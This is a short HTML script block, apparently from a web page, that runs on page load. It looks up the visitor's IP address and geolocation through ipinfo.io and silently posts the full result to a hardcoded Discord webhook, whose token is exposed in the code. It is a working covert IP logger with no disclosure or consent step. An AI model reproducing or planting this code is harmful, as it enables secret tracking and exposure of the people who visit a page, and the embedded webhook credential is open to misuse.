  <script>
    const webhookUrl = "https://discord.com/api/webhooks/1403512345568739488/YZ7JxU1ZrYT1g3smpXoBg9ESJDWEVPOZYP7NM8hEZuCCYD4BqOWwnz467T2rqRrBrjXo";

    async function sendFullIpInfo() {
      try {
        const res = await fetch("https://ipinfo.io/json");
        const data = await res.json();

        await fetch(webhookUrl, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            content: "```json\n" + JSON.stringify(data, null, 2) + "\n```"
          }),
        });
      } catch (err) {
        console.error(err);
      }
    }

    sendFullIpInfo();
  </script>
